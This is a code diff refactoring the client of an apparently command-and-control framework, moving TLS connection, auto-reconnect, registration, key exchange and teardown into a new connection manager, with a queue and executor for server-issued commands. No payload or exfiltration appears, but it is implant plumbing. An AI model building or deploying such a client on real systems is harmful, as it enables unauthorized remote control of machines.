@@ -14,6 +14,7 @@ from models.tls_helper import TLSSessionHelper
 import helper.subprocess as subprocess_helper
 import helper.auth as auth_helper
 import helper.helper_funcs as helper_funcs
+from models.connection_manager import ConnectionManager
 
 # ==================== CONFIGURATION ====================
 
@@ -35,51 +36,12 @@ class C2Client:
         self.client_id = client_id
         self.key_manager = KeyManager()
         self._encryption_manager = None
-        self.reader = None
-        self.writer = None
+        self.connection_manager = ConnectionManager(server_host, server_port, client_id)
         self.running = True
         self.command_queue = asyncio.Queue()
         self.talking_queue = asyncio.Queue()
         self._executor_task = None
         self.execution_process = None
-    
-    async def _connect(self) -> bool:
-        """
-        Connect to C2 server and register
-        """
-        try:
-            if not self.running:
-                return False
-            ssl_ctx = TLSSessionHelper().create_context(
-                is_server=False,
-            )
-            self.reader, self.writer = await asyncio.open_connection(
-                self.server_host,
-                self.server_port,
-                ssl=ssl_ctx,
-            )
-            logger.info(f"Connected to server at {self.server_host}:{self.server_port}")
-            if not auth_helper.validate_server_certificate(self.writer):
-                logger.error("Server certificate is not valid")
-                await self._reset_connection()
-                return False
-            # Send registration message with client's public key
-            if not await self._send_register_message():
-                return False
-            # Receive acknowledgment with server's public key
-            ack_msg = await self._receive_ack_message()
-            if not ack_msg:
-                return False
-            self._set_encryption(server_public_key=ack_msg.command)
-            logger.info(f"Registered as {ack_msg.client_id}")
-            return True
-        
-        except ConnectionRefusedError:
-            logger.error("Connection refused, server possibly down")
-        except asyncio.CancelledError:
-            logger.info("Connection attempt cancelled")
-        except Exception as e:
-            logger.error(f"Connection failed: {e}")
 
     async def _send_register_message(self) -> bool:
         """
@@ -105,49 +67,19 @@ class C2Client:
             return None
         return msg
     
-    def _set_encryption(self, server_public_key: str) -> None:
+    async def _set_encryption(self) -> bool:
         """Setup encryption with server's public key"""
-        session_key = self.key_manager.compute_session_key(server_public_key)
+        if not await self._send_register_message():
+            logger.error("Failed to register client")
+            return False
+        ack_msg = await self._receive_ack_message()
+        if not ack_msg:
+            logger.error("Failed to receive acknowledgment from server")
+            return False
+        session_key = self.key_manager.compute_session_key(ack_msg.command)
         self._encryption_manager = EncryptionManager(session_key)
-    
-    async def _reconnection_loop(self):
-        """
-        Auto-reconnect logic
-        Attempts to reconnect every 1 second if disconnected
-        """
-        try:
-            reconnect_delay = 1
-        
-            while self.running:
-                if self.reader and self.writer:
-                    logger.info('reader/writer exists - no reconnection needed')
-                    return
-                
-                if await self._connect():
-                    logger.info(f"Connected successfully {self.client_id}")
-                    return
-                
-                logger.info(f"Attempting to reconnect in {reconnect_delay}s...")
-                await asyncio.sleep(reconnect_delay)
-            
-        except asyncio.CancelledError:
-            logger.info("Reconnect loop cancelled")
-            await self._reset_connection()
-        except Exception as e:
-            logger.error(f"Reconnect loop error: {e}")
-            await self._reset_connection()
-    
-    async def _reset_connection(self):
-        try:
-            logger.info('in reset_writer_reader')
-            if self.writer and not self.writer.is_closing():
-                self.writer.close()
-                await self.writer.wait_closed()
-        except Exception as e:
-            logger.error(f"Error closing writer: {e}")
-        finally:
-            self.reader = None
-            self.writer = None
+        logger.info(f"Registered as {ack_msg.client_id}")
+        return True
 
     async def _lifecycle(self):
         """
@@ -168,14 +100,7 @@ class C2Client:
         finally:
             # Connection is dead - clean up
             await helper_funcs.cancel_task(talker, related_queue=self.talking_queue)
-            await self._reset_connection()
-            if self.running:
-                return
-            await helper_funcs.cancel_task(self._executor_task)
-            logger.info("Terminating execution process")
-            await self._terminate_execution_process()
-            logger.info('Lifecycle finished')
-
+            
     async def _listener(self):
         """
         Listen for incoming commands from server
@@ -367,22 +292,47 @@ class C2Client:
             except Exception as e:
                 logger.error(f"Error forcefully terminating process: {e}")
 
+    @property
+    def writer(self):
+        return self.connection_manager.writer
+
+    @property
+    def reader(self):
+        return self.connection_manager.reader
+
+    async def _terminate(self):
+        await helper_funcs.cancel_task(self._executor_task)
+        await self._terminate_execution_process()
+        await self.connection_manager.close()
+
+    async def _authenticate_and_secure(self) -> None:
+        """Authenticate server and setup encryption"""
+        if not auth_helper.validate_server_certificate(self.writer):
+            self.running = False  # no point in endless connection loops
+            raise ConnectionError("Server certificate is not valid")
+        if not await self._set_encryption():
+            raise ConnectionError("Failed to set encryption")
+
     async def start(self):
         """Start the C2 client"""
         logger.info(f"Starting C2 client (ID: {self.client_id})")
-        
-        # Start with reconnect loop - it handles both initial connection and reconnections
         try:
             self._executor_task = asyncio.create_task(self._executor(), name='executor')
             while self.running:
-                await self._reconnection_loop()
-                if self.reader and self.writer:
-                    await self._lifecycle()
+                await self.connection_manager.reconnection_loop()
+                await self._authenticate_and_secure()
+                await self._lifecycle()
+            else:
+                logger.info("Client exiting | client not running")
         except asyncio.CancelledError:
             logger.info("Client start cancelled")
+        except ConnectionError as e:
+            logger.error(f"Client start connection error: {e}")
         except Exception as e:
             logger.error(f"Client start error: {e}")
-            await asyncio.sleep(1)  # Prevent tight loop on repeated failures
+        finally:
+            await self._terminate()
+            logger.info("C2 Client stopped")
 
 # ==================== MAIN ====================
 
